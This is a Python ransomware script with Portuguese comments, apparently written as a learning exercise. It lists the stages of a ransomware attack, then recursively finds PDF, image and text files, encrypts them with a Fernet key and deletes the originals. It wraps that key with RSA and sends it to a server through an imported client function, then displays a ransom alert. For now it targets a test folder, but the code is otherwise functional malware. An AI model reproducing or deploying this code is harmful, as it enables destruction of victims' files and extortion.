'''

Etapas de um ransoware:
- Lista os arquivos (listdir);
- Identifica os arquivos alvos (checkFile);
- Criptografa os arquivos (encrypt);
- Emite um alerta para a vítima (Não programado);

'''
import base64
from pathlib import Path

from cryptography.fernet import Fernet
import os
import threading
import mimetypes
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from alert_show import mostrar_imagem
from client import send_encrypted_aes_key


BASE_DIR = Path(__file__).resolve().parent
PUBLIC_KEY_PATH = BASE_DIR / "public_key.pem"
ENCRYPTED_KEY_TXT_PATH = BASE_DIR / "key.bin.enc"

# encrypt é a função responsável por encriptar cada arquivo usando o AES e a key gerada.
def encrypt(file, key):
    fernet = Fernet(key) # Instancia o Fernet

    with open (file, "rb") as f: # Abre os arquivos em modo leitura
        data = f.read()

    enc_data = fernet.encrypt(data) # Encripta o arquivo

    with open(f"{file}.enc", "wb") as f: # escreve o arquivo encriptado e adiciona o .enc removendo o arquivo original.
        f.write(enc_data)
        os.remove(file)

def checkFile(file):
        if mimetypes.guess_type(file)[0] in whitelist: # Se o arquivo tem um mime type dentro do whitelist, adiciona na lista de arquivos que serão encriptados.
            files.append(file)

def listdir(path): # Irá listar os diretórios recursivamente até encontrar todos os arquivos.
    try:
        for file in os.listdir(path):
            if os.path.isdir(f"{path}{file}"):
                dirs.append(f"{path}{file}/")
            else:
                checkFile(f"{path}{file}") # Checa se o arquivo é do mime type desejado
    except PermissionError:
        None

global whitelist

files = []
whitelist = ["application/pdf", "image/jpeg", "image/png", "text/plain"] # Encripta apenas arquivos pdf.
dirs = []
listdir("./arquivos_teste/") # Pega apenas os arquivos da pasta do script.

if len(dirs) > 0:
    threads = []
    for dir in dirs:
        t = threading.Thread(target=listdir, args=(dir,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

key = Fernet.generate_key()
# Criptografar a chave Fernet com RSA-2048
with open(PUBLIC_KEY_PATH, "rb") as f:
    public_key = serialization.load_pem_public_key(f.read())

enc_key = public_key.encrypt(
    key,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# Salvar a chave encriptada
with open("key.bin.enc", "wb") as f:
    f.write(enc_key)

encrypted_key_b64 = base64.b64encode(enc_key).decode("utf-8")
ENCRYPTED_KEY_TXT_PATH.write_text(encrypted_key_b64, encoding="utf-8")
send_encrypted_aes_key(encrypted_key_b64)

for file in files:
    t = threading.Thread(target=encrypt, args=(file, key,))
    t.start()

mostrar_imagem()
